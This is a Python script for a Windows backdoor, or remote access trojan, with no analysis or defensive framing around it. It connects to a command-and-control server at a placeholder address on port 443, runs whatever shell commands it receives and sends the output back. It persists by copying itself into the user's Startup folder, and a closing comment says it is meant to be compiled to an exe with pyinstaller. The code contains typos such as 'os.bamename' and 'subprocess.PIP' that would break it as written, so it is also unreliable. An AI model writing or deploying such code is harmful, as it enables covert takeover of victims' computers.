# import libraries
import socket
import subprocess
import threading
import time
import os

CCIP = "IP_ADD_SRV"
CCPORT = 443

# kepp connect with target machine even it restarted

def autorun():
    filen = os.bamename(__file__)
    exe_file = filen.replace(".py",".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))

def conn(CCIP, CCPORT):
    try: 
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIP)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as err:
        print(err)

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client,data)).start()
    except Exception as err:
        print(err)
        client.close()

if __name__ == '__main__':
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client=client)
        else:
            time.sleep(3)

# install pyinstaller py -> exe
